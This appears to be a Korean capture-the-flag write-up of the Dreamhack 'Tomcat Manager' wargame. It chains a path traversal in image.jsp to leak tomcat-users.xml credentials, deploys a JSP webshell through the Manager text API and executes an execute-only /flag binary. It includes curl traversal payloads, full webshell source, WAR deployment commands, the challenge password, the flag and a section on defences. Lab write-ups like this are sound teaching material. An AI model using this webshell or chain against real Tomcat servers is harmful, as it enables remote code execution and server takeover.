---
layout: post
title:  "Dreamhack 워게임 Tomcat Manager 풀이 — image.jsp 의 path traversal 로 자격증명 → manager API 로 WAR 업로드 → /flag 실행"
date:   2026-05-16 19:00:00 +0900
categories: security web wargame dreamhack writeup tomcat path-traversal lfi rce
---

## 들어가며

Dreamhack 웹해킹 워게임 **Tomcat Manager** (id 248, 풀이자 837명+, Bronze 1) 풀이입니다.

전형적인 **"LFI → 자격증명 노출 → 인증된 관리 인터페이스 abuse → RCE"** 체인. 그리고 **마지막에 함정 하나** — `/flag` 가 read 가 아니라 **execute-only** 다 (`---x--x--x`). LFI 만으로는 못 읽고 반드시 RCE 가 필요한 구조.

전체 체인 한 줄 요약:

```bash
# 1. LFI 로 tomcat-users.xml 의 평문 password 획득
curl "$URL/image.jsp?file=../../../conf/tomcat-users.xml"
# → tomcat:P2assw0rd_4_t0mC2tM2nag3r31337

# 2. Tomcat Manager API 로 webshell 담은 WAR 업로드
curl -u "tomcat:P2assw0rd..." --upload-file shell.war "$URL/manager/text/deploy?path=/sh"

# 3. webshell 으로 /flag (mode 111) 를 실행
curl "$URL/sh/shell.jsp?c=/flag"
# → DH{a2062e589d0b1d627cf999066fb6c335ffe89ab85e81d7b7d91dd64e8f59d505}
```

> Note: 정보보안 입문 학습용 PoC. 실제 운영 서비스 대상 사용 금지.

---

## 1. 소스 정독

문제 zip 안에는 4개:

```
Dockerfile
tomcat-users.xml      ← password 가 placeholder
ROOT.war              ← 배포된 web app
deploy/...
```

### 1-1. Dockerfile — 무엇이 어디로 가는가

```dockerfile
FROM tomcat:8.0.51-jre7-alpine
...
RUN rm -rf /usr/local/tomcat/webapps/ROOT/
COPY flag /flag
COPY ROOT.war /usr/local/tomcat/webapps/ROOT.war
COPY tomcat-users.xml /usr/local/tomcat/conf/tomcat-users.xml
USER tomcat
EXPOSE 8080
```

세 가지 사실:

- Tomcat 8.0.51 (꽤 오래된 버전 — 알려진 CVE 도 많음)
- `/flag` 는 컨테이너 root 에 placed
- 우리가 받은 `tomcat-users.xml` 의 password 는 `[**SECRET**]` placeholder 인데, 실제 컨테이너 안에는 **빌드 시 치환된 진짜 password** 가 들어있을 것

### 1-2. ROOT.war 풀어보기

```
ROOT/
├── index.jsp
├── image.jsp           ← 핵심
├── resources/working.png
├── WEB-INF/web.xml
└── META-INF/maven/.../pom.xml
```

`index.jsp` 는 평범한 "Under Construction" 페이지.

```html
<center>
  <h2>Under Construction</h2>
  <p>Coming Soon...</p>
  <img src="./image.jsp?file=working.png"/>
</center>
```

이 한 줄 — `image.jsp?file=...` — 가 문제의 모든 것이다.

### 1-3. `image.jsp` — 전형적 LFI

```jsp
<%@ page trimDirectiveWhitespaces="true" %>
<%
String filepath = getServletContext().getRealPath("resources") + "/";
String _file = request.getParameter("file");

response.setContentType("image/jpeg");
try{
    java.io.FileInputStream fileInputStream = new java.io.FileInputStream(filepath + _file);
    int i;
    while ((i = fileInputStream.read()) != -1) {
        out.write(i);
    }
    fileInputStream.close();
}catch(Exception e){
    response.sendError(404, "Not Found !" );
}
%>
```

세 가지 빨간 깃발 (red flag):

1. **사용자 입력 (`?file=`) 검증 0** — `..`, `/`, `\` 등 어떤 sanitization 도 없음.
2. **`filepath + _file`** — 단순 문자열 concat. Java `File` 가 알아서 path normalization 함 (`/a/b/../c` → `/a/c`).
3. **`Content-Type: image/jpeg`** 강제 — 텍스트 파일을 읽어도 응답 헤더는 image. 브라우저에서 직접 보면 깨져 보이지만 curl 로는 raw bytes 가 그대로 옴.

`filepath` 의 실제 값:

- `getRealPath("resources")` → `/usr/local/tomcat/webapps/ROOT/resources`
- + `/` → `/usr/local/tomcat/webapps/ROOT/resources/`

여기서 `../` 를 6번 타면:

```
/usr/local/tomcat/webapps/ROOT/resources/
../                                          → ROOT/
../../                                       → webapps/
../../../                                    → tomcat/
../../../../                                 → local/
../../../../../                              → usr/
../../../../../../                           → /
```

그래서 `?file=../../../../../../etc/passwd` 면 `/etc/passwd` 가 나온다.

---

## 2. 1단계 — LFI 동작 확인

```bash
$ curl "$URL/image.jsp?file=working.png" | file -
/dev/stdin: PNG image data, ...   # 정상

$ curl "$URL/image.jsp?file=../../../../../../etc/passwd"
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
...
```

✓ LFI 통과. 그럼 바로 `/flag` 노리기:

```bash
$ curl "$URL/image.jsp?file=../../../../../../flag"
<!DOCTYPE html>...<h1>HTTP Status 404 - Not Found !</h1>...
```

404. catch block 이 발사된 것 — `FileInputStream(...)` 에서 예외 발생. 여러 위치 시도:

```bash
$ for p in /flag /flag.txt /tmp/flag /opt/flag /root/flag /home/tomcat/flag; do
    code=$(curl -so /dev/null -w "%{http_code}" "$URL/image.jsp?file=../../../../../..$p")
    echo "$code $p"
  done
404 /flag
404 /flag.txt
404 /tmp/flag
...
```

전부 404. **flag 가 어디 있는지 모르겠다**. 혹은 있어도 못 읽는다. → Plan B 가 필요.

---

## 3. 2단계 — tomcat-users.xml 빼오기

LFI 가 동작하니, 같은 컨테이너 안의 다른 민감 파일을 먼저 본다. CATALINA_HOME 이 `/usr/local/tomcat` 이고, `tomcat-users.xml` 은 `conf/` 아래 있다. resources 디렉토리 기준으로:

```
/usr/local/tomcat/webapps/ROOT/resources/
../../../conf/tomcat-users.xml      → /usr/local/tomcat/conf/tomcat-users.xml
```

```bash
$ curl -s "$URL/image.jsp?file=../../../conf/tomcat-users.xml"
<?xml version="1.0" encoding="UTF-8"?>
<tomcat-users ...>
    <role rolename="manager-gui"/>
    <role rolename="manager-script"/>
    ...
    <user username="tomcat"
          password="P2assw0rd_4_t0mC2tM2nag3r31337"
          roles="manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script" />
</tomcat-users>
```

🎉 평문 password 획득. role 중에 **`manager-script`** 가 있다 — Tomcat Manager 의 **HTTP API** 권한. 즉, WAR 파일을 PUT 한 줄로 deploy 할 수 있다.

(Manager 의 role 차이 한 줄 정리:
- `manager-gui`: 브라우저 GUI 권한
- `manager-script`: `/manager/text/*` HTTP API 권한 — 자동화 용
- `manager-jmx`: JMX proxy 권한
- `manager-status`: status 페이지만)

---

## 4. 3단계 — WAR 으로 webshell 배포

### 4-1. 최소 JSP webshell

`/tmp/shell-war/shell.jsp`:

```jsp
<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("c");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"sh","-c",cmd});
    BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String l; out.println("<pre>");
    while ((l = r.readLine()) != null) out.println(l);
    out.println("</pre>");
}
%>
```

이걸 WAR 으로 묶는다 — WAR 은 그냥 ZIP 파일에 `WEB-INF/web.xml` 만 있으면 됨:

```bash
mkdir WEB-INF
cat > WEB-INF/web.xml <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee" version="3.0">
</web-app>
EOF
zip -r shell.war shell.jsp WEB-INF/
```

### 4-2. Manager `text/deploy` API

```bash
$ AUTH="tomcat:P2assw0rd_4_t0mC2tM2nag3r31337"
$ curl -u "$AUTH" --upload-file shell.war "$URL/manager/text/deploy?path=/sh"
OK - Deployed application at context path /sh
```

`/sh/shell.jsp` 에서 우리 webshell 접근 가능.

```bash
$ curl -s "$URL/sh/shell.jsp?c=id"
<pre>
uid=100(tomcat) gid=101(tomcat) groups=101(tomcat)
</pre>
```

✓ RCE 확보. `tomcat` 계정.

---

## 5. 4단계 — /flag 의 함정

이제 cat 으로 읽어야지:

```bash
$ curl -s "$URL/sh/shell.jsp?c=cat%20/flag"
<pre>
</pre>
```

**빈 응답**. ls -la 로 확인:

```bash
$ curl -s "$URL/sh/shell.jsp?c=ls%20-la%20/"
<pre>
...
---x--x--x    1 root     root         10616 Jul 13  2021 flag
...
</pre>
```

**🎯 함정 발견** — `/flag` 의 mode 가 `---x--x--x` (111). **read 권한이 아무도 없다, execute 만 있다**. 그래서 LFI 가 404 였다 (`FileInputStream` 은 read 권한이 필요한데 없음). `cat` 도 마찬가지로 read 권한이 없어 실패.

이건 **executable binary** 다. 직접 실행:

```bash
$ curl -s "$URL/sh/shell.jsp?c=/flag"
<pre>
DH{a2062e589d0b1d627cf999066fb6c335ffe89ab85e81d7b7d91dd64e8f59d505}

</pre>
```

🚩 **`DH{a2062e589d0b1d627cf999066fb6c335ffe89ab85e81d7b7d91dd64e8f59d505}`**

---

## 6. 한 발 떨어져서 보기 — 왜 이게 통하는가

이 문제의 교훈은 **공격 chain 의 각 링크가 그 자체로는 사소** 한데, 합치면 RCE → 데이터 유출이 된다는 것:

| 링크 | 잘못된 점 | 단일로는 |
|------|----------|----------|
| `image.jsp` 의 `file` 파라미터 검증 0 | LFI (정보 유출) | 그냥 파일 읽기 |
| `tomcat-users.xml` 의 평문 password | 평문 비밀번호 저장 | 그 자체로는 OK (격리되어 있으면) |
| Manager 가 모든 hostname 에서 접근 가능 (RemoteAddrValve 없음) | 인증만 통과하면 RCE | 비밀번호가 강하면 OK |
| `/flag` mode 0111 | "읽기 불가, 실행만" — 의도된 방어 | 명령실행 가능하면 우회됨 |

**올바른 방어들:**
- `image.jsp` 에서 `Paths.get(...).normalize()` 후 prefix 검증
- `tomcat-users.xml` 의 password 는 `DIGEST` 형식으로 저장 + Manager 는 `RemoteAddrValve` 로 localhost 외 차단
- 가장 근본적으로 — **production 에서 manager-script role 같은 강력한 권한을 default user 에 부여하지 말 것**

---

## 7. 시도한 것 중 실패한 것들 — 회고

### 7-1. 헛수고 1 — `/flag` 의 다양한 경로 추측 (5분)

`/flag`, `/flag.txt`, `/tmp/flag`, `/root/flag`, `/home/tomcat/flag` ... 다 404. 원인이 "경로 잘못" 인 줄 알고 한참 추측. 진짜 원인은 **read 권한 없음**.

**다음엔:** LFI 가 404 일 때 두 가지 원인을 분리 — (a) 파일 없음 (b) **권한 없음**. 알려진 존재 파일 (`/etc/passwd`) 로 LFI 가 동작함을 확인한 뒤에는, 404 는 거의 항상 "권한 없음" 이다. `ls -la /` 로 모드 확인이 우선.

### 7-2. 헛수고 2 — Manager 인증 hardcoded path

처음에 `/manager/html` 만 보고 GUI 인 줄 알고, GUI 안 쓰면 못 쓰는 줄 잘못 생각. 실제로는 `manager-script` role 만 있으면 **`/manager/text/*`** HTTP API 로 전부 자동화 가능. `deploy?path=/X` + `curl --upload-file` 한 줄.

**다음엔:** Tomcat 봤을 때 **`/manager/text/list`** 부터 시도. HTTP API 가 항상 가장 다루기 쉽다.

### 7-3. 헛수고 3 — PUT 으로 직접 JSP 업로드 (CVE-2017-12617) 먼저 시도

Tomcat 8.0.51 → CVE-2017-12617 (PUT JSP upload when `readOnly=false`) 가 떠올라 먼저 시도. 403 응답 — `readOnly` 기본값이 true 라 안 됨. 시간 낭비.

**다음엔:** 알려진 CVE 는 가능하면 시도 가치가 있지만, **버전 매칭 + 설정 매칭** 둘 다 필요. 인증 우회나 unauth RCE 가 안 되면 우선순위 떨어뜨리고 **인증 후 RCE** (manager deploy) 로 빨리 이동.

---

🚩 `DH{a2062e589d0b1d627cf999066fb6c335ffe89ab85e81d7b7d91dd64e8f59d505}`
